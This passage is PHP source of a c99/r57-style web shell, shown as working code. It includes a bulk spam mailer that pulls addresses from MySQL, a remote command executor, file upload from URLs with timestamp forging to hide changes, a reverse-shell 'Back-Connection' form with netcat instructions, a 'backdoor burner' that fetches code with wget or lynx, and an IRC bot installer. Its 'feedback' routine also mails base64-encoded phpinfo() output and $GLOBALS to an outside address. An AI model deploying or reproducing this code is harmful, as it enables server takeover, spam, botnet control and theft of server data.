<option value="vb_" onclick="document.getElementById('pattes').value='Select email From user'">------------------vbull--------------------
</select><br>
<input type="button" value="Change Query !" onclick="document.getElementById('pattes').type='text'">
 <input type="Button" Value="Select Only YAhoo ! "> 
 <input type="Submit" value="Load Addresses from MySQL" name="toschak">

</form>


</font></td>
</tr>
</table>
&nbsp;</td>
</tr>
</table>
<p>&nbsp;
</div>
<table width="100%" border="0">

<tr> 

</tr>

</table>



&nbsp;<?

if ($action=="send"){



	if (!$from && !$subject && !$message && !$emaillist){

	print "Please complete all fields before sending your message.";

	exit;

	}

	

	$allemails = split("\n", $emaillist);

	$numemails = count($allemails);



	#Open the file attachment if any, and base64_encode it for email transport

	If ($file_name){

		@copy($file, "./$file_name") or die("The file you are trying to upload couldn't be copied to the server");

		$content = fread(fopen($file,"r"),filesize($file));

		$content = chunk_split(base64_encode($content));

		$uid = strtoupper(md5(uniqid(time())));

		$name = basename($file);

	}

	

	for($x=0; $x<$numemails; $x++){
       $to = $allemails[$x];
	
		

		if ($to){

		$to = ereg_replace(" ", "", $to);

		$message = ereg_replace("&email&", $to, $message);

		$subject = ereg_replace("&email&", $to, $subject);

		print "<b><font size=2>Sending mail to <font color=red>$to</font>.......->oK </b></font><br>";

		flush();

		$header = "From: $realname <$from>\r\nReply-To: $replyto\r\n";

		$header .= "MIME-Version: 1.0\r\n";

		If ($file_name) $header .= "Content-Type: multipart/mixed; boundary=$uid\r\n";

		If ($file_name) $header .= "--$uid\r\n";

		$header .= "Content-Type: text/$contenttype\r\n";

		$header .= "Content-Transfer-Encoding: 8bit\r\n\r\n";

		$header .= "$message\r\n";

		If ($file_name) $header .= "--$uid\r\n";

		If ($file_name) $header .= "Content-Type: $file_type; name=\"$file_name\"\r\n";

		If ($file_name) $header .= "Content-Transfer-Encoding: base64\r\n";

		If ($file_name) $header .= "Content-Disposition: attachment; filename=\"$file_name\"\r\n\r\n";

		If ($file_name) $header .= "$content\r\n";

		If ($file_name) $header .= "--$uid--";

		mail($to, $subject, "", $header);

echo "<img src='http://localhost/c99_safe_mode/c100.php?act=img&img=Success'>";
flush();

		}

		}



}






}


if ($act == "feedback") 
{ 
 $suppmail = base64_decode("Yzk5c2hlbGxAY2N0ZWFtLnJ1"); 
 if (!empty($submit)) 
 { 
$ticket = substr(md5(microtime()+rand(1,1000)),0,6); 
$body = "c99shell v.".$shver." feedback #".$ticket."\nName: ".htmlspecialchars($fdbk_name)."\nE-mail: ".htmlspecialchars($fdbk_email)."\nMessage:\n".htmlspecialchars($fdbk_body)."\n\nIP: ".$REMOTE_ADDR; 
if (!empty($fdbk_ref)) 
{ 
$tmp = @ob_get_contents(); 
ob_clean(); 
phpinfo(); 
$phpinfo = base64_encode(ob_get_contents()); 
ob_clean(); 
echo $tmp; 
$body .= "\n"."phpinfo(): ".$phpinfo."\n"."\$GLOBALS=".base64_encode(serialize($GLOBALS))."\n"; 
} 
mail($suppmail,"c99shell v.".$shver." feedback #".$ticket,$body,"FROM: ".$suppmail); 
echo "<center><b>Thanks for your feedback! Your ticket ID: ".$ticket.".</b></center>"; 
 } 
 else {echo "<form action=\"".$surl."\" method=POST><input type=hidden name=act value=feedback><b>Feedback or report bug (".str_replace(array("@","."),array("[at]","[dot]"),$suppmail)."):<br><br>Your name: <input type=\"text\" name=\"fdbk_name\" value=\"".htmlspecialchars($fdbk_name)."\"><br><br>Your e-mail: <input type=\"text\" name=\"fdbk_email\" value=\"".htmlspecialchars($fdbk_email)."\"><br><br>Message:<br><textarea name=\"fdbk_body\" cols=80 rows=10>".htmlspecialchars($fdbk_body)."</textarea><input type=\"hidden\" name=\"fdbk_ref\" value=\"".urlencode($HTTP_REFERER)."\"><br><br>Attach server-info * <input type=\"checkbox\" name=\"fdbk_servinf\" value=\"1\" checked><br><br>There are no checking in the form.<br><br>* - strongly recommended, if you report bug, because we need it for bug-fix.<br><br>We understand languages: English, Russian.<br><br><input type=\"submit\" name=\"submit\" value=\"Send\"></form>";} 
} 
if ($act == "search") 
{ 
 echo "<b>Search in file-system:</b><br>"; 
 if (empty($search_in)) {$search_in = $d;} 
 if (empty($search_name)) {$search_name = "(.*)"; $search_name_regexp = 1;} 
 if (empty($search_text_wwo)) {$search_text_regexp = 0;} 
 if (!empty($submit)) 
 { 
$found = array(); 
$found_d = 0; 
$found_f = 0; 
$search_i_f = 0; 
$search_i_d = 0; 
$a = array 
( 
"name"=>$search_name, "name_regexp"=>$search_name_regexp, 
"text"=>$search_text, "text_regexp"=>$search_text_regxp, 
"text_wwo"=>$search_text_wwo, 
"text_cs"=>$search_text_cs, 
"text_not"=>$search_text_not 
); 
$searchtime = getmicrotime(); 
$in = array_unique(explode(";",$search_in)); 
foreach($in as $v) {c99fsearch($v);} 
$searchtime = round(getmicrotime()-$searchtime,4); 
if (count($found) == 0) {echo "<b>No files found!</b>";} 
else 
{ 
$ls_arr = $found; 
$disp_fullpath = TRUE; 
$act = "ls"; 
} 
 } 
 echo "<form method=POST> 
<input type=hidden name=\"d\" value=\"".$dispd."\"><input type=hidden name=act value=\"".$dspact."\"> 
<b>Search for (file/folder name): </b><input type=\"text\" name=\"search_name\" size=\"".round(strlen($search_name)+25)."\" value=\"".htmlspecialchars($search_name)."\">&nbsp;<input type=\"checkbox\" name=\"search_name_regexp\" value=\"1\" ".($search_name_regexp == 1?" checked":"")."> - regexp 
<br><b>Search in (explode \";\"): </b><input type=\"text\" name=\"search_in\" size=\"".round(strlen($search_in)+25)."\" value=\"".htmlspecialchars($search_in)."\"> 
<br><br><b>Text:</b><br><textarea name=\"search_text\" cols=\"122\" rows=\"10\">".htmlspecialchars($search_text)."</textarea> 
<br><br><input type=\"checkbox\" name=\"search_text_regexp\" value=\"1\" ".($search_text_regexp == 1?" checked":"")."> - regexp 
&nbsp;&nbsp;<input type=\"checkbox\" name=\"search_text_wwo\" value=\"1\" ".($search_text_wwo == 1?" checked":"")."> - <u>w</u>hole words only 
&nbsp;&nbsp;<input type=\"checkbox\" name=\"search_text_cs\" value=\"1\" ".($search_text_cs == 1?" checked":"")."> - cas<u>e</u> sensitive 
&nbsp;&nbsp;<input type=\"checkbox\" name=\"search_text_not\" value=\"1\" ".($search_text_not == 1?" checked":"")."> - find files <u>NOT</u> containing the text 
<br><br><input type=submit name=submit value=\"Search\"></form>"; 
 if ($act == "ls") {$dspact = $act; echo "<hr size=\"1\" noshade><b>Search took ".$searchtime." secs (".$search_i_f." files and ".$search_i_d." folders, ".round(($search_i_f+$search_i_d)/$searchtime,4)." objects per second).</b><br><br>";} 
} 
if ($act == "chmod") 
{ 
 $mode = fileperms($d.$f); 
 if (!$mode) {echo "<b>Change file-mode with error:</b> can't get current value.";} 
 else 
 { 
$form = TRUE; 
if ($chmod_submit) 
{ 
$octet = "0".base_convert(($chmod_o["r"]?1:0).($chmod_o["w"]?1:0).($chmod_o["x"]?1:0).($chmod_g["r"]?1:0).($chmod_g["w"]?1:0).($chmod_g["x"]?1:0).($chmod_w["r"]?1:0).($chmod_w["w"]?1:0).($chmod_w["x"]?1:0),2,8); 
if (chmod($d.$f,$octet)) {$act = "ls"; $form = FALSE; $err = "";} 
else {$err = "Can't chmod to ".$octet.".";} 
} 
if ($form) 
{ 
$perms = parse_perms($mode); 
echo "<b>Changing file-mode (".$d.$f."), ".view_perms_color($d.$f)." (".substr(decoct(fileperms($d.$f)),-4,4).")</b><br>".($err?"<b>Error:</b> ".$err:"")."<form action=\"".$surl."\" method=POST><input type=hidden name=d value=\"".htmlspecialchars($d)."\"><input type=hidden name=f value=\"".htmlspecialchars($f)."\"><input type=hidden name=act value=chmod><table align=left width=300 border=0 cellspacing=0 cellpadding=5><tr><td><b>Owner</b><br><br><input type=checkbox NAME=chmod_o[r] value=1".($perms["o"]["r"]?" checked":"").">&nbsp;Read<br><input type=checkbox name=chmod_o[w] value=1".($perms["o"]["w"]?" checked":"").">&nbsp;Write<br><input type=checkbox NAME=chmod_o[x] value=1".($perms["o"]["x"]?" checked":"").">eXecute</td><td><b>Group</b><br><br><input type=checkbox NAME=chmod_g[r] value=1".($perms["g"]["r"]?" checked":"").">&nbsp;Read<br><input type=checkbox NAME=chmod_g[w] value=1".($perms["g"]["w"]?" checked":"").">&nbsp;Write<br><input type=checkbox NAME=chmod_g[x] value=1".($perms["g"]["x"]?" checked":"").">eXecute</font></td><td><b>World</b><br><br><input type=checkbox NAME=chmod_w[r] value=1".($perms["w"]["r"]?" checked":"").">&nbsp;Read<br><input type=checkbox NAME=chmod_w[w] value=1".($perms["w"]["w"]?" checked":"").">&nbsp;Write<br><input type=checkbox NAME=chmod_w[x] value=1".($perms["w"]["x"]?" checked":"").">eXecute</font></td></tr><tr><td><input type=submit name=chmod_submit value=\"Save\"></td></tr></table></form>"; 
} 
 } 
} 
if ($act == "upload") 
{ 
 $uploadmess = ""; 
 $uploadpath = str_replace("\\",DIRECTORY_SEPARATOR,$uploadpath); 
 if (empty($uploadpath)) {$uploadpath = $d;} 
 elseif (substr($uploadpath,-1) != "/") {$uploadpath .= "/";} 
 if (!empty($submit)) 
 { 
global $HTTP_POST_FILES; 
$uploadfile = $HTTP_POST_FILES["uploadfile"]; 
if (!empty($uploadfile["tmp_name"])) 
{ 
if (empty($uploadfilename)) {$destin = $uploadfile["name"];} 
else {$destin = $userfilename;} 
if (!move_uploaded_file($uploadfile["tmp_name"],$uploadpath.$destin)) {$uploadmess .= "Error uploading file ".$uploadfile["name"]." (can't copy \"".$uploadfile["tmp_name"]."\" to \"".$uploadpath.$destin."\"!<br>";} 
} 
elseif (!empty($uploadurl)) 
{ 
if (!empty($uploadfilename)) {$destin = $uploadfilename;} 
else 
{ 
 $destin = explode("/",$destin); 
 $destin = $destin[count($destin)-1]; 
 if (empty($destin)) 
 { 
$i = 0; 
$b = ""; 
while(file_exists($uploadpath.$destin)) {if ($i > 0) {$b = "_".$i;} $destin = "index".$b.".html"; $i++;}} 
} 
if ((!eregi("http://",$uploadurl)) and (!eregi("https://",$uploadurl)) and (!eregi("ftp://",$uploadurl))) {echo "<b>Incorect url!</b><br>";} 
else 
{ 
 $st = getmicrotime(); 
 $content = @file_get_contents($uploadurl); 
 $dt = round(getmicrotime()-$st,4); 
 if (!$content) {$uploadmess .="Can't download file!<br>";} 
 else 
 { 
if ($filestealth) {$stat = stat($uploadpath.$destin);} 
$fp = fopen($uploadpath.$destin,"w"); 
if (!$fp) {$uploadmess .= "Error writing to file ".htmlspecialchars($destin)."!<br>";} 
else 
{ 
fwrite($fp,$content,strlen($content)); 
fclose($fp); 
if ($filestealth) {touch($uploadpath.$destin,$stat[9],$stat[8]);} 
} 
 } 
} 
} 
 } 
 if ($miniform) 
 { 
echo "<b>".$uploadmess."</b>"; 
$act = "ls"; 
 } 
 else 
 { 
echo "<b>File upload:</b><br><b>".$uploadmess."</b><form enctype=\"multipart/form-data\" action=\"".$surl."act=upload&d=".urlencode($d)."\" method=POST> 
Select file on your local computer: <input name=\"uploadfile\" type=\"file\"><br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;or<br> 
Input URL: <input name=\"uploadurl\" type=\"text\" value=\"".htmlspecialchars($uploadurl)."\" size=\"70\"><br><br> 
Save this file dir: <input name=\"uploadpath\" size=\"70\" value=\"".$dispd."\"><br><br> 
File-name (auto-fill): <input name=uploadfilename size=25><br><br> 
<input type=checkbox name=uploadautoname value=1 id=df4>&nbsp;convert file name to lovercase<br><br> 
<input type=submit name=submit value=\"Upload\"> 
</form>"; 
 } 
} 
if ($act == "delete") 
{ 
 $delerr = ""; 
 foreach ($actbox as $v) 
 { 
$result = FALSE; 
$result = fs_rmobj($v); 
if (!$result) {$delerr .= "Can't delete ".htmlspecialchars($v)."<br>";} 
 } 
 if (!empty($delerr)) {echo "<b>Deleting with errors:</b><br>".$delerr;} 
 $act = "ls"; 
} 
if (!$usefsbuff) 
{ 
 if (($act == "paste") or ($act == "copy") or ($act == "cut") or ($act == "unselect")) {echo "<center><b>Sorry, buffer is disabled. For enable, set directive \"\$useFSbuff\" as TRUE.</center>";} 
} 
else 
{ 
 if ($act == "copy") {$err = ""; $sess_data["copy"] = array_merge($sess_data["copy"],$actbox); c99_sess_put($sess_data); $act = "ls"; } 
 elseif ($act == "cut") {$sess_data["cut"] = array_merge($sess_data["cut"],$actbox); c99_sess_put($sess_data); $act = "ls";} 
 elseif ($act == "unselect") {foreach ($sess_data["copy"] as $k=>$v) {if (in_array($v,$actbox)) {unset($sess_data["copy"][$k]);}} foreach ($sess_data["cut"] as $k=>$v) {if (in_array($v,$actbox)) {unset($sess_data["cut"][$k]);}} c99_sess_put($sess_data); $act = "ls";} 
 if ($actemptybuff) {$sess_data["copy"] = $sess_data["cut"] = array(); c99_sess_put($sess_data);} 
 elseif ($actpastebuff) 
 { 
$psterr = ""; 
foreach($sess_data["copy"] as $k=>$v) 
{ 
$to = $d.basename($v); 
if (!fs_copy_obj($v,$to)) {$psterr .= "Can't copy ".$v." to ".$to."!<br>";} 
if ($copy_unset) {unset($sess_data["copy"][$k]);} 
} 
foreach($sess_data["cut"] as $k=>$v) 
{ 
$to = $d.basename($v); 
if (!fs_move_obj($v,$to)) {$psterr .= "Can't move ".$v." to ".$to."!<br>";} 
unset($sess_data["cut"][$k]); 
} 
c99_sess_put($sess_data); 
if (!empty($psterr)) {echo "<b>Pasting with errors:</b><br>".$psterr;} 
$act = "ls"; 
 } 
 elseif ($actarcbuff) 
 { 
$arcerr = ""; 
if (substr($actarcbuff_path,-7,7) == ".tar.gz") {$ext = ".tar.gz";} 
else {$ext = ".tar.gz";} 
if ($ext == ".tar.gz") {$cmdline = "tar cfzv";} 
$cmdline .= " ".$actarcbuff_path; 
$objects = array_merge($sess_data["copy"],$sess_data["cut"]); 
foreach($objects as $v) 
{ 
$v = str_replace("\\",DIRECTORY_SEPARATOR,$v); 
if (substr($v,0,strlen($d)) == $d) {$v = basename($v);} 
if (is_dir($v)) 
{ 
 if (substr($v,-1) != DIRECTORY_SEPARATOR) {$v .= DIRECTORY_SEPARATOR;} 
 $v .= "*"; 
} 
$cmdline .= " ".$v; 
} 
$tmp = realpath("."); 
chdir($d); 
$ret = myshellexec($cmdline); 
chdir($tmp); 
if (empty($ret)) {$arcerr .= "Can't call archivator (".htmlspecialchars(str2mini($cmdline,60)).")!<br>";} 
$ret = str_replace("\r\n","\n",$ret); 
$ret = explode("\n",$ret); 
if ($copy_unset) {foreach($sess_data["copy"] as $k=>$v) {unset($sess_data["copy"][$k]);}} 
foreach($sess_data["cut"] as $k=>$v) 
{ 
if (in_array($v,$ret)) {fs_rmobj($v);} 
unset($sess_data["cut"][$k]); 
} 
c99_sess_put($sess_data); 
if (!empty($arcerr)) {echo "<b>Archivation errors:</b><br>".$arcerr;} 
$act = "ls"; 
 } 
 elseif ($actpastebuff) 
 { 
$psterr = ""; 
foreach($sess_data["copy"] as $k=>$v) 
{ 
$to = $d.basename($v); 
if (!fs_copy_obj($v,$d)) {$psterr .= "Can't copy ".$v." to ".$to."!<br>";} 
if ($copy_unset) {unset($sess_data["copy"][$k]);} 
} 
foreach($sess_data["cut"] as $k=>$v) 
{ 
$to = $d.basename($v); 
if (!fs_move_obj($v,$d)) {$psterr .= "Can't move ".$v." to ".$to."!<br>";} 
unset($sess_data["cut"][$k]); 
} 
c99_sess_put($sess_data); 
if (!empty($psterr)) {echo "<b>Pasting with errors:</b><br>".$psterr;} 
$act = "ls"; 
 } 
} 
if ($act == "cmd") 
{ 
if (trim($cmd) == "ps -aux") {$act = "processes";} 
elseif (trim($cmd) == "tasklist") {$act = "processes";} 
else 
{ 
 @chdir($chdir); 
 if (!empty($submit)) 
 { 
echo "<b>Result of execution this command</b>:<br>"; 
$olddir = realpath("."); 
@chdir($d); 
$ret = myshellexec($cmd); 
$ret = convert_cyr_string($ret,"d","w"); 
if ($cmd_txt) 
{ 
$rows = count(explode("\r\n",$ret))+1; 
if ($rows < 10) {$rows = 10;} 
echo "<br><textarea cols=\"122\" rows=\"".$rows."\" readonly>".htmlspecialchars($ret)."</textarea>"; 
} 
else {echo $ret."<br>";} 
@chdir($olddir); 
 } 
 else {echo "<b>Execution command</b>"; if (empty($cmd_txt)) {$cmd_txt = TRUE;}} 
 echo "<form action=\"".$surl."\" method=POST><input type=hidden name=act value=cmd><textarea name=cmd cols=122 rows=10>".htmlspecialchars($cmd)."</textarea><input type=hidden name=\"d\" value=\"".$dispd."\"><br><br><input type=submit name=submit value=\"Execute\">&nbsp;Display in text-area&nbsp;<input type=\"checkbox\" name=\"cmd_txt\" value=\"1\""; if ($cmd_txt) {echo " checked";} echo "></form>"; 
} 
} 
if ($act == "ls") 
{ 
 if (count($ls_arr) > 0) {$list = $ls_arr;} 
 else 
 { 
$list = array(); 
if ($h = @opendir($d)) 
{ 
while (($o = readdir($h)) !== FALSE) {$list[] = $d.$o;} 
closedir($h); 
} 
else {} 
 } 
 if (count($list) == 0) {echo "<center><b>Can't open folder (".htmlspecialchars($d).")!</b></center>";} 
 else 
 { 
//Building array 
$objects = array(); 
$vd = "f"; //Viewing mode 
if ($vd == "f") 
{ 
$objects["head"] = array(); 
$objects["folders"] = array(); 
$objects["links"] = array(); 
$objects["files"] = array(); 
foreach ($list as $v) 
{ 
 $o = basename($v); 
 $row = array(); 
 if ($o == ".") {$row[] = $d.$o; $row[] = "LINK";} 
 elseif ($o == "..") {$row[] = $d.$o; $row[] = "LINK";} 
 elseif (is_dir($v)) 
 { 
if (is_link($v)) {$type = "LINK";} 
else {$type = "DIR";} 
$row[] = $v; 
$row[] = $type; 
 } 
 elseif(is_file($v)) {$row[] = $v; $row[] = filesize($v);} 
 $row[] = filemtime($v); 
 if (!$win) 
 { 
$ow = posix_getpwuid(fileowner($v)); 
$gr = posix_getgrgid(filegroup($v)); 
$row[] = ($ow["name"]?$ow["name"]:fileowner($v))."/".($gr["name"]?$gr["name"]:filegroup($v)); 
 } 
 $row[] = fileperms($v); 
 if (($o == ".") or ($o == "..")) {$objects["head"][] = $row;} 
 elseif (is_link($v)) {$objects["links"][] = $row;} 
 elseif (is_dir($v)) {$objects["folders"][] = $row;} 
 elseif (is_file($v)) {$objects["files"][] = $row;} 
 $i++; 
} 
$row = array(); 
$row[] = "<b>Name</b>"; 
$row[] = "<b>Size</b>"; 
$row[] = "<b>Modify</b>"; 
if (!$win) 
{$row[] = "<b>Owner/Group</b>";} 
$row[] = "<b>Perms</b>"; 
$row[] = "<b>Action</b>"; 
$parsesort = parsesort($sort); 
$sort = $parsesort[0].$parsesort[1]; 
$k = $parsesort[0]; 
if ($parsesort[1] != "a") {$parsesort[1] = "d";} 
$y = "<a href=\"".$surl."act=".$dspact."&d=".urlencode($d)."&sort=".$k.($parsesort[1] == "a"?"d":"a")."\">"; 
$y .= "<img src=\"".$surl."act=img&img=sort_".($sort[1] == "a"?"asc":"desc")."\" height=\"9\" width=\"14\" alt=\"".($parsesort[1] == "a"?"Asc.":"Desc")."\" border=\"0\"></a>"; 
$row[$k] .= $y; 
for($i=0;$i<count($row)-1;$i++) 
{ 
 if ($i != $k) {$row[$i] = "<a href=\"".$surl."act=".$dspact."&d=".urlencode($d)."&sort=".$i.$parsesort[1]."\">".$row[$i]."</a>";} 
} 
$v = $parsesort[0]; 
usort($objects["folders"], "tabsort"); 
usort($objects["links"], "tabsort"); 
usort($objects["files"], "tabsort"); 
if ($parsesort[1] == "d") 
{ 
 $objects["folders"] = array_reverse($objects["folders"]); 
 $objects["files"] = array_reverse($objects["files"]); 
} 
$objects = array_merge($objects["head"],$objects["folders"],$objects["links"],$objects["files"]); 
$tab = array(); 
$tab["cols"] = array($row); 
$tab["head"] = array(); 
$tab["folders"] = array(); 
$tab["links"] = array(); 
$tab["files"] = array(); 
$i = 0; 
foreach ($objects as $a) 
{ 
 $v = $a[0]; 
 $o = basename($v); 
 $dir = dirname($v); 
 if ($disp_fullpath) {$disppath = $v;} 
 else {$disppath = $o;} 
 $disppath = str2mini($disppath,60); 
 if (in_array($v,$sess_data["cut"])) {$disppath = "<strike>".$disppath."</strike>";} 
 elseif (in_array($v,$sess_data["copy"])) {$disppath = "<u>".$disppath."</u>";} 
 foreach ($regxp_highlight as $r) 
 { 
if (ereg($r[0],$o)) 
{ 
if ((!is_numeric($r[1])) or ($r[1] > 3)) {$r[1] = 0; ob_clean(); echo "Warning! Configuration error in \$regxp_highlight[".$k."][0] - unknown command."; c99shexit();} 
else 
{ 
 $r[1] = round($r[1]); 
 $isdir = is_dir($v); 
 if (($r[1] == 0) or (($r[1] == 1) and !$isdir) or (($r[1] == 2) and !$isdir)) 
 { 
if (empty($r[2])) {$r[2] = "<b>"; $r[3] = "</b>";} 
$disppath = $r[2].$disppath.$r[3]; 
if ($r[4]) {break;} 
 } 
} 
} 
 } 
 $uo = urlencode($o); 
 $ud = urlencode($dir); 
 $uv = urlencode($v); 
 $row = array(); 
 if ($o == ".") 
 { 
$row[] = "<img src=\"".$surl."act=img&img=small_dir\" height=\"16\" width=\"19\" border=\"0\">&nbsp;<a href=\"".$surl."act=".$dspact."&d=".urlencode(realpath($d.$o))."&sort=".$sort."\">".$o."</a>"; 
$row[] = "LINK"; 
 } 
 elseif ($o == "..") 
 { 
$row[] = "<img src=\"".$surl."act=img&img=ext_lnk\" height=\"16\" width=\"19\" border=\"0\">&nbsp;<a href=\"".$surl."act=".$dspact."&d=".urlencode(realpath($d.$o))."&sort=".$sort."\">".$o."</a>"; 
$row[] = "LINK"; 
 } 
 elseif (is_dir($v)) 
 { 
if (is_link($v)) 
{ 
$disppath .= " => ".readlink($v); 
$type = "LINK"; 
$row[] ="<img src=\"".$surl."act=img&img=ext_lnk\" height=\"16\" width=\"16\" border=\"0\">&nbsp;<a href=\"".$surl."act=ls&d=".$uv."&sort=".$sort."\">[".$disppath."]</a>"; 
} 
else 
{ 
$type = "DIR"; 
$row[] ="<img src=\"".$surl."act=img&img=small_dir\" height=\"16\" width=\"19\" border=\"0\">&nbsp;<a href=\"".$surl."act=ls&d=".$uv."&sort=".$sort."\">[".$disppath."]</a>"; 
} 
$row[] = $type; 
 } 
 elseif(is_file($v)) 
 { 
$ext = explode(".",$o); 
$c = count($ext)-1; 
$ext = $ext[$c]; 
$ext = strtolower($ext); 
$row[] ="<img src=\"".$surl."act=img&img=ext_".$ext."\" border=\"0\">&nbsp;<a href=\"".$surl."act=f&f=".$uo."&d=".$ud."&\">".$disppath."</a>"; 
$row[] = view_size($a[1]); 
 } 
 $row[] = date("d.m.Y H:i:s",$a[2]); 
 if (!$win) {$row[] = $a[3];} 
 $row[] = "<a href=\"".$surl."act=chmod&f=".$uo."&d=".$ud."\"><b>".view_perms_color($v)."</b></a>"; 
 if ($o == ".") {$checkbox = "<input type=\"checkbox\" name=\"actbox[]\" onclick=\"ls_reverse_all();\">"; $i--;} 
 else {$checkbox = "<input type=\"checkbox\" name=\"actbox[]\" id=\"actbox".$i."\" value=\"".htmlspecialchars($v)."\">";} 
 if (is_dir($v)) {$row[] = "<a href=\"".$surl."act=d&d=".$uv."\"><img src=\"".$surl."act=img&img=ext_diz\" alt=\"Info\" height=\"16\" width=\"16\" border=\"0\"></a>&nbsp;".$checkbox;} 
 else {$row[] = "<a href=\"".$surl."act=f&f=".$uo."&ft=info&d=".$ud."\"><img src=\"".$surl."act=img&img=ext_diz\" alt=\"Info\" height=\"16\" width=\"16\" border=\"0\"></a>&nbsp;<a href=\"".$surl."act=f&f=".$uo."&ft=edit&d=".$ud."\"><img src=\"".$surl."act=img&img=change\" alt=\"Change\" height=\"16\" width=\"19\" border=\"0\"></a>&nbsp;<a href=\"".$surl."act=f&f=".$uo."&ft=download&d=".$ud."\"><img src=\"".$surl."act=img&img=download\" alt=\"Download\" height=\"16\" width=\"19\" border=\"0\"></a>&nbsp;".$checkbox;} 
 if (($o == ".") or ($o == "..")) {$tab["head"][] = $row;} 
 elseif (is_link($v)) {$tab["links"][] = $row;} 
 elseif (is_dir($v)) {$tab["folders"][] = $row;} 
 elseif (is_file($v)) {$tab["files"][] = $row;} 
 $i++; 
} 
} 
// Compiling table 
$table = array_merge($tab["cols"],$tab["head"],$tab["folders"],$tab["links"],$tab["files"]); 
echo "<center><b>Listing folder (".count($tab["files"])." files and ".(count($tab["folders"])+count($tab["links"]))." folders):</b></center><br><TABLE cellSpacing=0 cellPadding=0 width=100% bgColor=#333333 borderColorLight=#433333 border=0><form action=\"".$surl."\" method=POST name=\"ls_form\"><input type=hidden name=act value=".$dspact."><input type=hidden name=d value=".$d.">"; 
foreach($table as $row) 
{ 
echo "<tr>\r\n"; 
foreach($row as $v) {echo "<td>".$v."</td>\r\n";} 
echo "</tr>\r\n"; 
} 
echo "</table><hr size=\"1\" noshade><p align=\"right\"> 
<script> 
function ls_setcheckboxall(status) 
{ 
var id = 1; 
var num = ".(count($table)-2)."; 
while (id <= num) 
{ 
 document.getElementById('actbox'+id).checked = status; 
 id++; 
} 
} 
function ls_reverse_all() 
{ 
var id = 1; 
var num = ".(count($table)-2)."; 
while (id <= num) 
{ 
 document.getElementById('actbox'+id).checked = !document.getElementById('actbox'+id).checked; 
 id++; 
} 
} 
</script> 
<input type=\"button\" onclick=\"ls_setcheckboxall(true);\" value=\"Select all\">&nbsp;&nbsp;<input type=\"button\" onclick=\"ls_setcheckboxall(false);\" value=\"Unselect all\">
<b><img src=\"".$surl."act=img&img=arrow_ltr\" border=\"0\">"; 
if (count(array_merge($sess_data["copy"],$sess_data["cut"])) > 0 and ($usefsbuff)) 
{ 
echo "<input type=submit name=actarcbuff value=\"Pack buffer to archive\">&nbsp;<input type=\"text\" name=\"actarcbuff_path\" value=\"archive_".substr(md5(rand(1,1000).rand(1,1000)),0,5).".tar.gz\">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<input type=submit name=\"actpastebuff\" value=\"Paste\">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<input type=submit name=\"actemptybuff\" value=\"Empty buffer\">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;"; 
} 
echo "<select name=act><option value=\"".$act."\">With selected:</option>"; 
echo "<option value=delete".($dspact == "delete"?" selected":"").">Delete</option>"; 
echo "<option value=chmod".($dspact == "chmod"?" selected":"").">Change-mode</option>"; 
if ($usefsbuff) 
{ 
echo "<option value=cut".($dspact == "cut"?" selected":"").">Cut</option>"; 
echo "<option value=copy".($dspact == "copy"?" selected":"").">Copy</option>"; 
echo "<option value=unselect".($dspact == "unselect"?" selected":"").">Unselect</option>"; 
} 
echo "</select>&nbsp;<input type=submit value=\"Confirm\"></p>"; 
echo "</form>"; 
 } 
} 
if ($act == "tools") 
{ 






 ?> 
<TABLE style="BORDER-COLLAPSE: collapse" cellSpacing=0 borderColorDark=#666666 cellPadding=5 height="116" width="100%" bgColor=#333333 borderColorLight=#c0c0c0 border=1>
<tr><td height="1" valign="top" colspan="2"><p align="center"><b>:: <a href="<?php echo $surl; ?>act=cmd&d=<?php echo urlencode($d); ?>"><b>Bind Functions By r57</b></a> ::</b></p></td></tr>
<tr>
<td width="33%" height="83" valign="top"><center>
 <div align="center">
 </div>
 <form action="<?php echo $surl; ?>">
<b>Bind With Backd00r Burner</b></br><form action="<?php echo $surl;?>"><input type=hidden name=act value=tools><select size=\"1\" name=dolma><option value="wgetcan">Use Wget</option><option value="lynxcan">Use lynx -dump</option><option value="freadcan">Use Fread</option></select></br></br><input type="submit" value="Burn it bAby"></form>
 </td>
<td width="33%" height="83" valign="top"><center>
<center>

 
<b>Back-Connection :</b></br><form action="<?php echo $surl;?>"> <b>Ip (default is your ip) :</br> </b><input type=hidden name=act value=tools><input type="text" name="ipi" value="<?echo getenv('REMOTE_ADDR');?>"></br><b>Port:</br></b><input type="text" name="pipi" value="4392"></br><input type="submit" value="C0nnect ->"></br></form>
Click "Connect" only after open port for it. You should use NetCat&copy;, run "<b>nc -l -n -v -p <?php echo $bc_port; ?></b>"!<br><br>

</center>
 </td>
 <td width="33%" height="83" valign="top"><center>
<center>

 
<b>Irc Control&copy; </b></br>
<form method="POst" action="<?php echo $surl;?>"> <b>Admin&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</b><input type=hidden name=act value=tools><input type="text" name="adminofirc" value="Psych0"></br><b>IRC Server</b>
<input type="text" name="ircserver" value="irc.opera.com"></br>
<b>#Kanal&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<input type="text" name="channel" value="Area 0f Psych0"></br>
 <b>BotNicki&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<input type="text" name="botniki" value="Area 0f Psych0"></br>
 <b>Bot_Yeri&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<input type="text" name="yer" value="/tmp/begin2.pl"></br>
<b>BotId&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<input type="text" name="botid" value="Chatter"></br>
	 <b>IRCId&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<input type="text" name="ircid" value="LinuX"></br>

</br><input type="submit" value="C0nnect ->"></br>






</form>
<br><br>

</center>
 </td>
</tr></TABLE>
 <?if (!empty($_POST['ircserver']))
 {
 $ircadmin=$_POST['adminofirc'];
 $ircserver=$_POST['ircserver'];
 $ircchan=$_POST['channel'];
 $irclabel=$_POST['botniki'];
 $ircpath=$_POST['yer'];
 $ircname=$_POST['botid'];
 $ircid=$_POST['ircid'];
 $preparing=base64_decode($irc_connect);
 $flux = fopen($ircpath,"w");
fputs($flux,$file);
